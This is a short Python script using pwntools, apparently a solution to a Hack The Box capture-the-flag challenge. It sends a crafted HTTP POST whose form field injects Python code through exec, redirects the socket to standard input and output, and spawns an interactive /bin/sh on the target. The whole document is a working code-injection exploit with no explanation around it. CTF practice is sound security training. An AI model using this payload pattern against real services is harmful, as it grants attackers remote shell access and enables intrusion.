from pwn import *
cmd = '1;exec "'
cmd += 'a=__import__(\'os\');'
cmd += 'b=__import__(\'subprocess\');'
cmd += 'a.dup2(4, 0);'
cmd += 'a.dup2(4, 1);'
cmd += 'a.dup2(4, 2);'
cmd += 'b.call([\'/bin/sh\', \'-i\'])"'
body = 'ingredient=x&measurements={}'.format(cmd)
payload = "POST / HTTP/1.1\r\n"
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: {}\r\n".format(len(body))
payload += "Connection: keep-alive\r\n"
payload += "\r\n"
payload += "{}\r\n".format(body)
payload += "\r\n"
s = remote('docker.hackthebox.eu', 31175)
s.send(payload)
s.interactive()
s.close()
